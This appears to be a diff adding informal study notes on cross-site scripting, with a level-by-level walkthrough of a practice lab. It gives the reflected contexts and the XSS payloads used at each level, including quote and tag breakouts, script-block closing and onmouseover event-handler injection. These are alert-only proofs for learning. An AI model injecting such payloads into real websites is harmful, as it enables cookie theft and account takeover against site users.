@@ -1,0 +1,132 @@
+impact of xss
+1. cookie theft
+2. keylogging
+3. phishing
+4. url redirection
+
+types of xss
+
+1.reflected xss
+2. stored xss
+3.DOM-based xss
+#=====================================================
+basic xss
+1. find nput parameter
+2.try javascript
+<script>alert(1)<script>
+3.exploitation of xss
+
+for this fing some comman pages like contact us ,search bar, comment box, forums , signup, login page, etc
+
+then find input parameters
+give any input there , if your input reflect back to you
+try to inject any javascript there
+
+"> for closing then we can add our alert command
+
+where we want to run our script there we have to check the value we are enter and what happen then we use that 
+like if it ends like <"">
+then ">our script
+
+#=============================================================
+
+lab practice on xss practice lab -1 website
+
+1.document.URL
+2.we enter mayo and check 
+then we enter
+><script>alert(document.URL)</script>
+
+3.on three we again check the value then we got 
+"mayo">
+now then we use
+"><script>alert(document.URL)</script>
+
+4.here again same
+we got
+'mayo'>
+
+then we use
+'><script>alert(document.URL)</script>
+
+5.then again we use mayo we got
+<center><script>var search_str="mayo";</script>
+
+now we can use
+</script><script>alert(document.URL)</script>
+
+6.then again we try and we got this 
+<center><script>var search_str='mayo';</script>
+
+now again we use
+</script><script>alert(document.URL)</script>
+
+7.we get 
+value='mayo'></input>
+
+then
+
+'><script>alert(document.URL)</script>
+
+we got this 
+<input type="text" name="name" value=''<scriptalert(document.URL)</script'></input>
+
+then we use
+
+whenever input become a string response you can try to give input thruogh mouse
+then we use onmouse payload
+
+ex
+
+onmouseover=alert(document.URL);
+
+'onmouseover=alert(document.URL);'
+
+then we move mouse on that field then our script execute
+
+and we got in source page
+input type="text" name="name" value=''onmouseover=alert(document.URL);''></input>
+
+
+8.again same then  we got 
+value='hello'></input>
+
+then we try
+
+'><script>alert(document.URL)</script>
+
+and we got this 
+
+value='&lt;script&gt;alert(document.URL)&lt;/script&gt;'></input>
+
+now check may be there are any other value
+
+we check and we find that that there are two things in website link
+name
+submit
+
+then we try to change submit value
+
+then we try with lol
+
+and we got lol instead search
+
+with that we got
+
+">
+
+then try 
+"><script>alert(1)</script>
+again not work then we try 
+
+a.  if your input correctly placed outside of any html tag js execute otherwise not execute
+
+we try
+
+"onmouseover="alert(document.URL);
+
+complete the challange.
+
+
+
+
